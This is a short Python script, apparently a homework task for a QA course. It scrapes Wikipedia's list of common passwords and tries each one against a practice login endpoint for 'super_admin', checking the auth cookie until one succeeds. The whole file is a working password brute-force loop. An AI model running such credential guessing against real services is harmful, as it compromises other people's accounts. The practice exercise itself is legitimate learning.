import requests
from lxml import html


address_get_token = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
address_check_token = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

page = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").text
tree = html.fromstring(page)
# Getting the list of the passwords from Wikipedia and removing duplicates from the list using set
passwords = set(tree.xpath('//h3[span[@id="SplashData"]]//following-sibling::table[1]//td[@align="left"]/text()'))
for password in passwords:
    password = password.rstrip()
    payload = {"login": "super_admin", "password": password}
# Getting cookie
    response1 = requests.post(address_get_token, data=payload)
# Checking if the cookie is correct
    response2 = requests.get(url=address_check_token, cookies=response1.cookies)
    response_text = response2.text
    if response_text != "You are NOT authorized":
        print(f"Response is: {response_text}. Correct password found: {password}")
        break


